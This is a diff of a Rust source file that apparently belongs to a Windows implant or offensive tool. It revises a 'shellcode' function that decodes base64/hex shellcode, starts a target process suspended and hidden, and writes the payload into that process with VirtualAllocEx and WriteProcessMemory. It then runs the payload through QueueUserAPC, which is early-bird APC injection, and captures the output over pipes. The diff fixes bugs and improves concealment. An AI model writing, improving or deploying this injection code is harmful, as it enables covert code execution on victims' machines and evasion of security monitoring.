@@ -1,7 +1,9 @@
+use base64::prelude::*;
 use std::{
-    ffi::c_void,
+    ffi::{c_void, OsStr},
     io::{Error, ErrorKind, Result},
     mem::{size_of, transmute},
+    os::windows::ffi::OsStrExt,
     sync::mpsc::{channel, Receiver},
     thread,
     time::Duration,
@@ -10,8 +12,8 @@ use windows::{
     core::{HSTRING, PCWSTR, PWSTR},
     Win32::{
         Foundation::{
-            CloseHandle, HANDLE, HANDLE_FLAG_INHERIT, SetHandleInformation,
-            STILL_ACTIVE,
+            BOOL, CloseHandle, GetLastError, HANDLE, HANDLE_FLAG_INHERIT, HANDLE_FLAGS,
+            SetHandleInformation, STILL_ACTIVE,
         },
         Security::SECURITY_ATTRIBUTES,
         Storage::FileSystem::ReadFile,
@@ -26,9 +28,10 @@ use windows::{
                 CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW,
                 GetExitCodeThread,
                 PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
-                STARTUPINFOW, STARTUPINFOW_FLAGS
+                STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOW, STARTUPINFOW_FLAGS
             },
         },
+        UI::WindowsAndMessaging::SW_HIDE,
     },
 };
 
@@ -43,30 +46,34 @@ unsafe impl Send for HandleSend {}
 pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
     let mut output: Vec<u8> = Vec::new();
 
-    let mut shellcode = base64::decode(shellcode_b64).unwrap();
+    let mut shellcode = BASE64_STANDARD.decode(shellcode_b64.as_bytes()).unwrap();
+    let mut shellcode = hex::decode(shellcode).unwrap();
+    println!("shellcode: {:?}", shellcode);
     let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void;
 
-    let mut hread_stdin = HANDLE(0);
-    let mut hwrite_stdin = HANDLE(0);
-    let mut hread_stdout = HANDLE(0);
-    let mut hwrite_stdout = HANDLE(0);
+    let mut hread_stdin = HANDLE::default();
+    let mut hwrite_stdin = HANDLE::default();
+    let mut hread_stdout = HANDLE::default();
+    let mut hwrite_stdout = HANDLE::default();
 
-    let mut sa = SECURITY_ATTRIBUTES::default();
+    let mut secattr = SECURITY_ATTRIBUTES::default();
+    secattr.bInheritHandle = BOOL(true as i32);
+    secattr.lpSecurityDescriptor = std::ptr::null_mut() as *mut c_void;
 
     // Create pipes
     let _ = unsafe {
         CreatePipe(
             &mut hread_stdin,
             &mut hwrite_stdin,
-            Some(&mut sa),
+            Some(&mut secattr),
             0,
         )
     };
     let _ = unsafe {
         SetHandleInformation(
             hwrite_stdin,
-            0,
-            HANDLE_FLAG_INHERIT,
+            HANDLE_FLAG_INHERIT.0 as _,
+            HANDLE_FLAGS(0),
         )
     };
 
@@ -74,46 +81,34 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
         CreatePipe(
             &mut hread_stdout,
             &mut hwrite_stdout,
-            Some(&mut sa),
+            Some(&mut secattr),
             0,
         )
     };
     let _ = unsafe {
         SetHandleInformation(
             hread_stdout,
-            0,
-            HANDLE_FLAG_INHERIT,
+            HANDLE_FLAG_INHERIT.0 as _,
+            HANDLE_FLAGS(0),
         )
     };
 
-    let mut si = STARTUPINFOW {
-        cb: size_of::<STARTUPINFOW> as u32,
-        lpReserved: PWSTR::null(),
-        lpDesktop: PWSTR::null(),
-        lpTitle: PWSTR::null(),
-        dwX: 0,
-        dwY: 0,
-        dwXSize: 0,
-        dwYSize: 0,
-        dwXCountChars: 0,
-        dwYCountChars: 0,
-        dwFillAttribute: 0,
-        dwFlags: STARTUPINFOW_FLAGS(256),
-        wShowWindow: 1,
-        cbReserved2: 0,
-        lpReserved2: 0 as *mut u8,
-        hStdInput: hread_stdin,
-        hStdOutput: hwrite_stdout,
-        hStdError: hwrite_stdout,
-    };
-
-    // let mut pi = PROCESS_INFORMATION {
-    //     hProcess: HANDLE(0),
-    //     hThread: HANDLE(0),
-    //     dwProcessId: 0,
-    //     dwThreadId: 0,
-    // };
+    let mut si = STARTUPINFOW::default();
+    si.cb = size_of::<STARTUPINFOW> as u32;
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.wShowWindow = SW_HIDE.0 as u16;
+    si.hStdInput = hread_stdin;
+    si.hStdOutput = hwrite_stdout;
+    si.hStdError = hwrite_stdout;
+    
     let mut pi = PROCESS_INFORMATION::default();
+
+    let current_dir = std::env::current_dir().unwrap();
+    let current_dir = Some(current_dir.as_path());
+    let current_dir_ptr = current_dir
+        .map(|path| path.as_os_str().encode_wide().collect::<Vec<u16>>())
+        .map(|wide_path| wide_path.as_ptr())
+        .unwrap_or(std::ptr::null_mut());
 
     // Read the output of the shell in thread
     let mut out_buf: Vec<u8> = Vec::new();
@@ -131,19 +126,20 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
         }
     });
 
+    let process_name = process_name + "\0";
+    let mut process_name = OsStr::new(&process_name).encode_wide().collect::<Vec<u16>>();
+
     // Spawn suspended process
-    let mut process_name_clone = process_name.to_string();
-    let mut process_name_ptr: *mut u16 = process_name_clone.as_mut_ptr() as *mut u16;
-    let _ = unsafe {
+    let res = unsafe {
         CreateProcessW(
             PCWSTR::null(),
-            PWSTR(process_name_ptr),
+            PWSTR(process_name.as_mut_ptr()),
             None,
             None,
             true,
             CREATE_NO_WINDOW | CREATE_SUSPENDED,
             None,
-            PCWSTR::null(),
+            PCWSTR(current_dir_ptr),// PCWSTR::null(),
             &mut si,
             &mut pi,
         )
@@ -156,13 +152,13 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
         VirtualAllocEx(
             handle,
             None,
-            0 as _,
+            shellcode.len(),
             MEM_COMMIT,
             PAGE_READWRITE,
         )
     };
     let mut ret_len: usize = 0;
-    let _ = unsafe {
+    let res = unsafe {
         WriteProcessMemory(
             handle,
             shellcode_addr,
@@ -185,13 +181,18 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
     };
 
     // Queue shellcode for execution and resume thread
-    let _ = unsafe {
+    let res = unsafe {
         QueueUserAPC(
             Some(transmute(shellcode_addr)),
             pi.hThread,
             0 as _,
         )
     };
+    if res == 0 {
+        // println!("QueueUserAPC failed.");
+        return Err(Error::new(ErrorKind::Other, "QueueUserAPC failed."));
+    }
+
     let _ = unsafe { ResumeThread(pi.hThread) };
 
     // Close handles
@@ -218,33 +219,18 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
                     break;
                 }
                 Err(_) => {
-                    // output = obfstr::obfstr!("Could not get the output.").to_string();
                     break;
                 }
             }
         }
     }
 
+    if output.len() == 0 {
+        output = "No output.".to_string().into_bytes();
+    }
+
     Ok(output)
 }
-
-// pub trait IsZero {
-//     fn is_zero(&self) -> bool;
-// }
-
-// macro_rules! impl_is_zero {
-//     ($($t:ident)*) => ($(impl IsZero for $t {
-//         fn is_zero(&self) -> bool {
-//             *self == 0
-//         }
-//     })*)
-// }
-
-// impl_is_zero! { i8 i16 i32 i64 isize u8 u16 u32 u64 usize }
-
-// pub fn cvt<I: IsZero>(i: I) -> Result<I> {
-//     if i.is_zero() { Err(Error::last_os_error()) } else { Ok(i) }
-// }
 
 fn read_from_pipe(
     handle: HANDLE,
@@ -259,14 +245,6 @@ fn read_from_pipe(
     loop {
         let mut tmp_buf = [0u8; 10001];
         let mut numberofbytesread: u32 = 0;
-        // let res = cvt(unsafe {
-        //     ReadFile(
-        //         handle,
-        //         Some(&mut tmp_buf),
-        //         Some(&mut numberofbytesread),
-        //         None,
-        //     )
-        // });
 
         let res = unsafe {
             ReadFile(
@@ -277,10 +255,16 @@ fn read_from_pipe(
             )
         };
 
+        // println!("res: {:?}", res);
+        // println!("numberofbytesread: {:?}", numberofbytesread);
+
         match res {
             Ok(_) => {
                 buf.extend_from_slice(&tmp_buf);
                 total_read = total_read + numberofbytesread;
+
+                // println!("buf: {:?}", buf);
+                // println!("total_read: {:?}", total_read);
             },
             // Err(ref e) if e.kind() == ErrorKind::BrokenPipe => break,
             Err(_) => break,
